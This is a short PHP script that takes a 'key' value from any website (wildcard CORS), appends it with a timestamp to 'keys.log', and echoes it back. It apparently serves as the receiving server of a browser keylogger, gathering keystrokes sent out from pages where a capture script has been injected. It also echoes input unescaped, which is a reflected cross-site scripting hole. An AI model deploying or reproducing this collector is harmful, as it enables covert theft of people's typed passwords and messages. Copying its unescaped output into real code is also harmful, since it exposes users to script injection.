<?php
// Enable error reporting for debugging purposes
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Allow requests from any origin (CORS policy)
header("Access-Control-Allow-Origin: *");

// Check if the 'key' parameter is provided in the GET request
if (isset($_GET['key'])) {
    $key = $_GET['key']; // Capture the key

    // Log the key into 'keys.log' with a timestamp for better tracking
    $logEntry = "[" . date("Y-m-d H:i:s") . "] Key: " . $key . PHP_EOL;
    file_put_contents('keys.log', $logEntry, FILE_APPEND | LOCK_EX);

    // Acknowledge the logged key
    echo "Logged key: $key";
} else {
    // Return a message if no key is provided
    echo "No key received.";
}
?>
